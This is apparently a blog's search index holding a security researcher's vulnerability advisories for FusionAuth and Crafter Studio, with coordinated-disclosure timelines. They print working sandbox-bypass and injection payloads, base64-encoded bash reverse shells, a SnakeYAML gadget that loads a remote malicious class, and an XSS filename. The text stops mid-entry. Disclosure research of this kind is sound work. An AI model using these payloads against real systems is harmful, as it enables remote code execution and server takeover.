<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Apache airflow arbitrary file read</title>
      <link href="/2022/04/09/Apache-airflow-arbitrary-file-read/"/>
      <url>/2022/04/09/Apache-airflow-arbitrary-file-read/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache druid arbitrary file read</title>
      <link href="/2022/04/08/Apache-druid-arbitrary-file-read/"/>
      <url>/2022/04/08/Apache-druid-arbitrary-file-read/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Syncope Remote Code Execution via Flowable Groovy Script</title>
      <link href="/2022/04/08/Syncope-Remote-Code-Execution-via-Flowable-Groovy-Script/"/>
      <url>/2022/04/08/Syncope-Remote-Code-Execution-via-Flowable-Groovy-Script/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OFBiz 17.12.03 FreeMarker Template Injection (SSTI) to Remote Code Execution</title>
      <link href="/2022/04/08/OFBiz-17-12-03-FreeMarker-Template-Injection-SSTI-to-Remote-Code-Execution/"/>
      <url>/2022/04/08/OFBiz-17-12-03-FreeMarker-Template-Injection-SSTI-to-Remote-Code-Execution/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OFBiz 17.12.03 Arbitrary File Upload Getshell</title>
      <link href="/2022/04/08/OFBiz-17-12-03-Arbitrary-File-Upload-Getshell/"/>
      <url>/2022/04/08/OFBiz-17-12-03-Arbitrary-File-Upload-Getshell/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FusionAuth Remote code execution via Freemarker Sandbox bypass</title>
      <link href="/2022/04/08/FusionAuth-Remote-code-execution-via-Freemarker-Sandbox-bypass/"/>
      <url>/2022/04/08/FusionAuth-Remote-code-execution-via-Freemarker-Sandbox-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Freemarker sandbox bypass exists in fusionauth, which can lead to RCE. This is a bypass of the freemaker template injection vulnerability (cve-2020-7799). FusionAuth security team have discussed that this report is not issue with FusionAuth, but rather with Tomcat.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>FusionAuth</p><h1 id="Tested-Version"><a href="#Tested-Version" class="headerlink" title="Tested Version"></a>Tested Version</h1><p>FusionAuth 1.30.1</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>Enter the edit theme function, and the MENU: Home–&gt;Customizations–&gt;Themes–&gt;Edit</p><p>URL: <a href="http://192.168.3.17:9011/admin/theme/edit/53084d17-2b87-4d2f-83de-0491fb0bf786">http://192.168.3.17:9011/admin/theme/edit/53084d17-2b87-4d2f-83de-0491fb0bf786</a></p><p>Enter the general POC, and save; Automatically jump to the template, and then click preview. We can see the error.</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Freemarker-Sandbox-bypass/1.png"></p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Freemarker-Sandbox-bypass/2.png"></p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Freemarker-Sandbox-bypass/3.png"></p><p>For cve-2020-7799, the product is repaired by prohibiting loading any class, and security measures are further added in freemaker 2.3.30 (by default, any class cannot be loaded through reflection, etc.)</p><h2 id="BYPASS"><a href="#BYPASS" class="headerlink" title="BYPASS"></a>BYPASS</h2><p>The bypass principle is as follows:</p><p>Reference: <a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security.pdf">https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security.pdf</a></p><p>There are two main approaches to bypass the sandbox: </p><ol><li>accessing the Servlet context</li><li>accessing the Spring application context beans.</li></ol><p>Servlet context can be accessed through:</p><ul><li>request.servletContext</li><li>springMacroRequestContext.webApplicationContext.servletContext</li><li>beans.servletContext</li></ul><p>On a Tomcat server the Servlet context will contain the <code>org.apache.tomcat.InstanceManager</code> attribute which enables an attacker to instantiate arbitrary objects.</p><p>The ‘request.servletcontext’ condition is met, so the POC is constructed as follows:</p><pre><code>$&#123;request.servletContext.getAttribute(&#39;org.apache.tomcat.InstanceManager&#39;).newInstance(&#39;javax.script.ScriptEngineManager&#39;).getEngineByName(&#39;js&#39;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch /tmp/pwned&#39;)&quot;)&#125;</code></pre><p>After the preview, the Pwned file is successfully created in the TMP directory. We can getshell.</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Freemarker-Sandbox-bypass/4.png"></p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Freemarker-Sandbox-bypass/5.png"></p><p>The fusionauth security team discussed that it’s not issue with fusionauth, and replied that “The FreeMarker issue is a perfect storm type of issue. The fact that we use FreeMarker and it has access to the ServletContext and Tomcat has a class that allows RCE all combine to allow this. However, we will be moving off Tomcat in the next few months, so this will no longer be an issue.”</p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2021-10-01: Report sent to <a href="mailto:&#115;&#101;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#x40;&#102;&#117;&#115;&#105;&#111;&#110;&#x61;&#117;&#116;&#x68;&#x2e;&#105;&#x6f;">&#115;&#101;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#x40;&#102;&#117;&#115;&#105;&#111;&#110;&#x61;&#117;&#116;&#x68;&#x2e;&#105;&#x6f;</a><br>2022-01-14: Reply from <a href="mailto:&#x73;&#x65;&#99;&#x75;&#x72;&#x69;&#116;&#x79;&#x40;&#x66;&#117;&#115;&#x69;&#111;&#110;&#x61;&#117;&#x74;&#x68;&#46;&#x69;&#111;">&#x73;&#x65;&#99;&#x75;&#x72;&#x69;&#116;&#x79;&#x40;&#x66;&#117;&#115;&#x69;&#111;&#110;&#x61;&#117;&#x74;&#x68;&#46;&#x69;&#111;</a> that it’s not issue with FusionAuth, and offer me a $500 bounty.<br>2022-04-08: Request for disclosure details and approval to disclosure</p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#104;&#x61;&#112;&#112;&#121;&#104;&#x61;&#99;&#x6b;&#105;&#x6e;&#x67;&#64;&#x6f;&#x75;&#116;&#108;&#111;&#x6f;&#107;&#46;&#105;&#116;">&#104;&#x61;&#112;&#112;&#121;&#104;&#x61;&#99;&#x6b;&#105;&#x6e;&#x67;&#64;&#x6f;&#x75;&#116;&#108;&#111;&#x6f;&#107;&#46;&#105;&#116;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FusionAuth Remote code execution via Lambdas Sandbox bypass</title>
      <link href="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/"/>
      <url>/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Lambdas sandbox bypass exists in fusionauth, which can lead to remote code execution. FusionAuth is using the Nashorn JavaScript engine to compile and execute lambdas functions. Although fusionauth uses ClassFilter to restrict the execution of arbitrary classes, there is a bypass. Similarly，fusionAuth security team have discussed that this report is not issue with FusionAuth, but rather with Nashorn.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>FusionAuth</p><h1 id="Tested-Version"><a href="#Tested-Version" class="headerlink" title="Tested Version"></a>Tested Version</h1><p>FusionAuth 1.30.1</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>The business process that triggers the execution of Lambdas script is as follows（take GitHub OpenID for example）：</p><p>Configure Lambdas and identity providers according to the following product documents:<br><a href="https://fusionauth.io/docs/v1/tech/lambdas/">https://fusionauth.io/docs/v1/tech/lambdas/</a><br><a href="https://fusionauth.io/docs/v1/tech/identity-providers/openid-connect/github/">https://fusionauth.io/docs/v1/tech/identity-providers/openid-connect/github/</a></p><p>Configure Lambdas script：<br>Enter the edit Lambdas function, and the MENU:<br>Home–&gt;Customizations–&gt;Lambdas–&gt;edit(Default OpenID Connect Reconcile provided by FusionAuth)</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/1.png"></p><p>Enter the POC, and save.</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/2.png"></p><p>Configure Identity Providers：<br>Enter the edit Identity Providers function, and the MENU:<br>Home–&gt;Settings–&gt;Identity Providers–&gt;Add OpenID Connect</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/3.png"></p><p>Configure GitHub openid connect as shown in the figure below, set enable and save.<br>Select the configured Lambdas (Default OpenID Connect Reconcile provided by FusionAuth) with the reconcile lambda parameter.</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/4.png"></p><p>Logout Fusionauth and log in with GitHub OpenID, trigger POC execution in Lambdas script.</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/5.png"></p><p>It is found that POC is not executed successfully. Login to view the log：<br><code>java.lang.RuntimeException: java.lang.ClassNotFoundException: java.lang.Runtime.getRuntime</code></p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/6.png"></p><p>Consider the Lambdas function to set security restrictions： The engine is configured to use a ClassFilter in order to Prohibit any explicit call to java code.</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/7.png"></p><h2 id="Principle-of-bypassing-ClassFilter-restrictions："><a href="#Principle-of-bypassing-ClassFilter-restrictions：" class="headerlink" title="Principle of bypassing ClassFilter restrictions："></a>Principle of bypassing ClassFilter restrictions：</h2><ul><li>The filter above does not expose any Java classes to the Javascript scripts, but the ClassFilter on its own is not sufficient to prevent code execution since Nashorn exposes the underlying engine to the script and it is still possible to execute arbitrary code with it. For example, the script below will start a system process:</li></ul><p><code>this.engine.factory.scriptEngine.eval(&#39;java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/pwned&quot;)&#39;)</code></p><ul><li>Construct the final POC as follows, modify the contents of lambda again, and then save：</li></ul><pre><code>function reconcile() &#123;    this.engine.factory.scriptEngine.eval(&#39;java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/pwned&quot;)&#39;); &#125;</code></pre><p>Ignore the page error, which has no impact on saving and execution.</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/8.png"></p><p>Logout Fusionauth and log in with GitHub OpenID, trigger new POC execution in Lambdas script.</p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/9.png"></p><p>Ignore the page error, which has no effect on the execution of Lambdas script.<br>After the login operation, the pwned file is successfully created in the TMP directory. </p><p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/10.png"></p><p>Execute the get reverse shell command to obtain operating system permissions.</p><pre><code>function reconcile() &#123;    this.engine.factory.scriptEngine.eval(&#39;java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#39;); &#125;</code></pre><p>The fusionauth security team discussed that it’s not issue with fusionauth, and replied that “Similarly, with Nashorn, it appears that they also are the primary issue because they provide access to the context, which also allows RCE. We are also moving off Nashorn in the next few months and will work to ensure that our new JavaScript engine provides better sandboxing.”</p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2021-10-01: Report sent to <a href="mailto:&#115;&#101;&#x63;&#x75;&#114;&#105;&#116;&#121;&#x40;&#102;&#x75;&#115;&#105;&#111;&#110;&#x61;&#x75;&#x74;&#104;&#x2e;&#x69;&#111;">&#115;&#101;&#x63;&#x75;&#114;&#105;&#116;&#121;&#x40;&#102;&#x75;&#115;&#105;&#111;&#110;&#x61;&#x75;&#x74;&#104;&#x2e;&#x69;&#111;</a><br>2022-01-14: Reply from <a href="mailto:&#115;&#x65;&#99;&#x75;&#x72;&#x69;&#116;&#121;&#64;&#x66;&#x75;&#x73;&#x69;&#111;&#110;&#97;&#x75;&#x74;&#104;&#46;&#x69;&#x6f;">&#115;&#x65;&#99;&#x75;&#x72;&#x69;&#116;&#121;&#64;&#x66;&#x75;&#x73;&#x69;&#111;&#110;&#97;&#x75;&#x74;&#104;&#46;&#x69;&#x6f;</a> that it’s not issue with FusionAuth, and offer me a $500 bounty.<br>2022-04-08: Request for disclosure details and approval to disclosure</p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#x68;&#97;&#x70;&#112;&#x79;&#104;&#97;&#99;&#x6b;&#x69;&#110;&#103;&#x40;&#x6f;&#x75;&#116;&#108;&#x6f;&#111;&#107;&#x2e;&#x69;&#116;">&#x68;&#97;&#x70;&#112;&#x79;&#104;&#97;&#99;&#x6b;&#x69;&#110;&#103;&#x40;&#x6f;&#x75;&#116;&#108;&#x6f;&#111;&#107;&#x2e;&#x69;&#116;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-23262: Crafter Studio Snakeyaml deserialization vulnerability bypass</title>
      <link href="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/"/>
      <url>/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Snakeyaml deserialization vulnerability bypass in Crafter Studio.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Crafter Studio</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Crafter Studio 3.1 &lt; 3.1.13</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>After analysis, the global config function uses snakeyaml component to process yaml configuration file.</p><p><img src="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/1.png"></p><p>Try to deserialize attack, Many attempts failed to make use of script engine gadget. C3p0wrapperconnpool can be used to load remote malicious classes and RCE.  </p><p>Write a malicious class that can get a shell: Exploit.java</p><p><img src="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/2.png"></p><p>Compile class: javac Exploit.java</p><p><img src="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/3.png"></p><p>Use nc to monitor port 5555.</p><p><img src="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/4.png"></p><p>Create a web server with Python and put the malicious class into the root directory of the web server to load the class remotely when deserializing.<br><a href="http://192.168.3.17:7777/">http://192.168.3.17:7777/</a></p><p><img src="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/5.png"></p><p>Generate an C3P0WrapperConnPool gadget payload.<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.SnakeYAML C3P0WrapperConnPool http://192.168.3.17:7777/ Exploit</code><br>attacker ip: <a href="http://192.168.3.17:7777/">http://192.168.3.17:7777/</a>  , the last ‘&#x2F;‘ must exist.<br>Malicious class name：Exploit</p><p><img src="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/6.png"></p><p>At this time, the payload cannot be used directly and an error will be reported</p><p>Use “set:” bypass restrictions, modify the payload format, pay attention to the strict check indentation, the final payload is：</p><pre><code>set:  ? !!com.mchange.v2.c3p0.WrapperConnectionPoolDataSourceuserOverridesAsString: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740019687474703a2f2f3139322e3136382e332e31373a373737372f740003466f6f;&quot; </code></pre><p><img src="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/7.png"></p><p>After saving, the server successfully loads the malicious class remotely and getshell.</p><p><img src="/2022/04/08/CVE-2021-23262-Crafter-Studio-Snakeyaml-deserialization-vulnerability-bypass/8.png"></p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2021-01-15: Report sent to <a href="mailto:&#x73;&#x65;&#99;&#117;&#x72;&#105;&#116;&#121;&#64;&#x63;&#x72;&#x61;&#x66;&#x74;&#x65;&#114;&#115;&#x6f;&#102;&#116;&#x77;&#x61;&#x72;&#x65;&#x2e;&#99;&#111;&#109;">&#x73;&#x65;&#99;&#117;&#x72;&#105;&#116;&#121;&#64;&#x63;&#x72;&#x61;&#x66;&#x74;&#x65;&#114;&#115;&#x6f;&#102;&#116;&#x77;&#x61;&#x72;&#x65;&#x2e;&#99;&#111;&#109;</a><br>2021-01-20: Issue is acknowledged.<br>2021-02-16: Issue is fixed.<br>2021-12-01: Issue was disclosed.</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2021-23262</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120105">https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120105</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#x68;&#97;&#112;&#112;&#x79;&#104;&#x61;&#99;&#x6b;&#105;&#x6e;&#103;&#64;&#x6f;&#117;&#x74;&#108;&#x6f;&#x6f;&#x6b;&#x2e;&#105;&#x74;">&#x68;&#97;&#112;&#112;&#x79;&#104;&#x61;&#99;&#x6b;&#105;&#x6e;&#103;&#64;&#x6f;&#117;&#x74;&#108;&#x6f;&#x6f;&#x6b;&#x2e;&#105;&#x74;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-23258: Crafter Studio Spring SPEL Expression Language Injection</title>
      <link href="/2022/04/08/CVE-2021-23258-Crafter-Studio-Spring-SPEL-Expression-Language-Injection/"/>
      <url>/2022/04/08/CVE-2021-23258-Crafter-Studio-Spring-SPEL-Expression-Language-Injection/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Authenticated attackers with developer privileges in Crafter Studio may execute OS commands via Spring SPEL Expression Language Injection.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Crafter Studio</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Crafter Studio 3.1 &lt; 3.1.12</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>Attackers may execute OS commands by SPEL Expression which spring beans. SPEL Expression does not have security restrictions, which will cause attackers to execute arbitrary commands remotely(RCE).</p><p>Edit site and click “Site Config”–&gt;”Configuration”–&gt;”Engine Site Application Context”</p><p>Modify the bean property value of application-context.xml. Spring Bean property value default support spel expression，We can use spel expression to execute OS commands and get operating system permissions. </p><p><img src="/2022/04/08/CVE-2021-23258-Crafter-Studio-Spring-SPEL-Expression-Language-Injection/1.png"></p><p>Payload1 : <code>#&#123;T(java.lang.Runtime).getRuntime().exec(&#39;touch /tmp/hacked&#39;)&#125;</code></p><p>Click save to execute the system command successfully, and create the hacked file in the &#x2F;TMP&#x2F; directory</p><p><img src="/2022/04/08/CVE-2021-23258-Crafter-Studio-Spring-SPEL-Expression-Language-Injection/2.png"></p><p>Payload2 ：<br><code>#&#123;T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTcvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;&quot;)&#125;</code></p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2021-01-01: Report sent to <a href="mailto:&#x73;&#x65;&#x63;&#x75;&#x72;&#105;&#116;&#x79;&#x40;&#99;&#114;&#x61;&#x66;&#x74;&#101;&#x72;&#115;&#111;&#102;&#116;&#x77;&#x61;&#x72;&#101;&#x2e;&#99;&#x6f;&#x6d;">&#x73;&#x65;&#x63;&#x75;&#x72;&#105;&#116;&#x79;&#x40;&#99;&#114;&#x61;&#x66;&#x74;&#101;&#x72;&#115;&#111;&#102;&#116;&#x77;&#x61;&#x72;&#101;&#x2e;&#99;&#x6f;&#x6d;</a><br>2021-01-01: Issue is acknowledged.<br>2021-01-05: Issue is fixed.<br>2021-12-01: Issue was disclosed.</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2021-23258</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120101">https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120101</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#104;&#x61;&#x70;&#112;&#121;&#104;&#x61;&#99;&#107;&#x69;&#x6e;&#103;&#64;&#111;&#117;&#116;&#x6c;&#111;&#x6f;&#x6b;&#x2e;&#105;&#x74;">&#104;&#x61;&#x70;&#112;&#121;&#104;&#x61;&#99;&#107;&#x69;&#x6e;&#103;&#64;&#111;&#117;&#116;&#x6c;&#111;&#x6f;&#x6b;&#x2e;&#105;&#x74;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-23259: Crafter Studio Groovy Sandbox Bypass</title>
      <link href="/2022/04/08/CVE-2021-23259-Crafter-Studio-Groovy-Sandbox-Bypass/"/>
      <url>/2022/04/08/CVE-2021-23259-Crafter-Studio-Groovy-Sandbox-Bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Groovy Sandbox Bypass (CVE-2020-25802 bypass) in Crafter Studio may execute OS commands.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Crafter Studio</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Crafter Studio 3.1 &lt; 3.1.12</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>CVE-2020-25802:<br>Authenticated attackers with developer privileges in Crafter Studio may execute OS commands via Groovy scripting.<br>POC:</p><pre><code>import java.lang.reflect.Method;Class&lt;?&gt; rt = Class.forName(&quot;java.lang.Runtime&quot;);Method gr = rt.getMethod(&quot;getRuntime&quot;);Method ex = rt.getMethod(&quot;exec&quot;,String.class);ex.invoke(gr.invoke(null),&quot;touch /tmp/thisistest&quot;);</code></pre><p>I try to execute the command with this POC, But it failed.</p><p><img src="/2022/04/08/CVE-2021-23259-Crafter-Studio-Groovy-Sandbox-Bypass/1.png"></p><p>Bypass：<br>Try to use AST to bypass sandbox limitation，POC：</p><pre><code>this.class.classLoader.parseClass(&#39;&#39;&#39;@groovy.transform.ASTTest(value=&#123;    assert java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/pwned&quot;)&#125;)def x&#39;&#39;&#39;);</code></pre><p><img src="/2022/04/08/CVE-2021-23259-Crafter-Studio-Groovy-Sandbox-Bypass/2.png"></p><p>Successfully executed arbitrarily OS command.</p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2021-01-01: Report sent to <a href="mailto:&#115;&#x65;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#64;&#x63;&#114;&#97;&#102;&#x74;&#101;&#x72;&#115;&#x6f;&#x66;&#x74;&#x77;&#97;&#x72;&#x65;&#x2e;&#99;&#x6f;&#109;">&#115;&#x65;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#64;&#x63;&#114;&#97;&#102;&#x74;&#101;&#x72;&#115;&#x6f;&#x66;&#x74;&#x77;&#97;&#x72;&#x65;&#x2e;&#99;&#x6f;&#109;</a><br>2021-01-02: Issue is acknowledged.<br>2021-01-06: Issue is fixed.<br>2021-12-01: Issue was disclosed.</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2021-23259</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120102">https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120102</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#104;&#x61;&#112;&#x70;&#121;&#104;&#97;&#x63;&#x6b;&#105;&#x6e;&#103;&#64;&#x6f;&#x75;&#x74;&#x6c;&#111;&#x6f;&#x6b;&#x2e;&#105;&#116;">&#104;&#x61;&#112;&#x70;&#121;&#104;&#97;&#x63;&#x6b;&#105;&#x6e;&#103;&#64;&#x6f;&#x75;&#x74;&#x6c;&#111;&#x6f;&#x6b;&#x2e;&#105;&#116;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-23260: Crafter Studio Stored XSS Vulnerability in File Name of the File Upload function</title>
      <link href="/2022/04/08/CVE-2021-23260-Crafter-Studio-Stored-XSS-Vulnerability-in-File-Name-of-the-File-Upload-function/"/>
      <url>/2022/04/08/CVE-2021-23260-Crafter-Studio-Stored-XSS-Vulnerability-in-File-Name-of-the-File-Upload-function/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Stored XSS Vulnerability in File Name of the File Upload function in Crafter Studio.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Crafter Studio</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Crafter Studio 3.1 &lt; 3.1.12</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>Visit to site-dashboard, select “Static Assets”, it can upload files.</p><p><img src="/2022/04/08/CVE-2021-23260-Crafter-Studio-Stored-XSS-Vulnerability-in-File-Name-of-the-File-Upload-function/1.png"></p><p>Click Upload button, and use burpsuite intercept requests. Modify the filename parameter to payload: <code>&lt;img src=x onerror=alert(1)&gt;</code></p><p><img src="/2022/04/08/CVE-2021-23260-Crafter-Studio-Stored-XSS-Vulnerability-in-File-Name-of-the-File-Upload-function/2.png"></p><p>After the upload is successful, XSS will be triggered when other users visit the file list pages. </p><p><img src="/2022/04/08/CVE-2021-23260-Crafter-Studio-Stored-XSS-Vulnerability-in-File-Name-of-the-File-Upload-function/3.png"></p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2021-01-01: Report sent to <a 